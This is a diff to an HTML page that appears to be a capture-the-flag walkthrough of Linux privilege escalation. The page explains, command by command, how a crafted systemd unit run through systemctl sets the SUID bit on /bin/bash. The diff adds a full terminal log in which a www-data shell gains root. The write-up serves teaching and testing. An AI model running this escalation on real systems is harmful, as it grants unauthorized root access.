@@ -2149,7 +2149,7 @@ WantedBy=multi-user.target&#39; &gt; $TempFile
 <p><code>ExecStart=/bin/sh -c “chmod +s /bin/bash”</code> - when the service starts call the default system shell (the -c tells the shell to execute everything inside the quotes),<br />
 we have given suid permission to /bin/bash which can allow us to run bash as root.</p>
 <p>[Install] - the second part of our unit file</p>
-<p><code>WantedBy=multi-user.target’ &gt; $TempFile</code>- sets the state (or runlevel) at which this service will run (notice the closing single quote?), the &gt; directs all our inputs to the TempFile env variable</p>
+<p><code>WantedBy=multi-user.target’ &gt; $TempFile</code>- sets the state (or run level) at which this service will run (notice the closing single quote?), the &gt; directs all our inputs to the TempFile env variable</p>
 <p><code>/bin/systemctl link $TempFile</code> - per the systemctl man page, this makes our unit file available for systemctl commands even though it is outside of the standard search paths</p>
 <p><code>/bin/systemctl enable —now $TempFile</code> - “…Enable one or more units or unit instances. This will create a set of symlinks, as encoded in the <code>&quot;[Install]&quot;</code> sections of the indicated unit files. After the symlinks have been created, the system manager configuration is reloaded (in a way equivalent to daemon-reload), in order to ensure the changes are taken into account immediately. Note that this does not have the effect of also starting any of the units being enabled. If this is desired, combine this command with the <code>--now</code> switch…”</p>
 <h2 id="root-shell">Root shell</h2>
@@ -2162,7 +2162,18 @@ USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                                                                         
 /bin/sh: 0: can&#39;t access tty; job control turned off                                                                                                                                          
 $ id                                                                                                                                                                                          
-uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                                                               
+uid=33(www-data) gid=33(www-data) groups=33(www-data) 
+$ TempFile=$(mktemp).service                                                                                                                                                                  
+echo &#39;[Service]                                                                                                                                                                               
+Type=oneshot                                                                                                                                                                                  
+ExecStart=/bin/sh -c &#34;chmod +s /bin/bash&#34;                                                                                                                                                     
+[Install]                                                                                                                                                                                     
+WantedBy=multi-user.target&#39; &gt; $TempFile                                                                                                                                                       
+/bin/systemctl link $TempFile                                                                                                                                                                 
+/bin/systemctl enable --now $TempFile                                                                                                                                                         
+/bin/bash -p$ &gt; &gt; &gt; &gt; $ Created symlink from /etc/systemd/system/tmp.xB76fAiWD8.service to /tmp/tmp.xB76fAiWD8.service.                                                                       
+$ Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.xB76fAiWD8.service to /tmp/tmp.xB76fAiWD8.service.
+                                                                                                                              
 $ /bin/bash -p
 whoami
 root
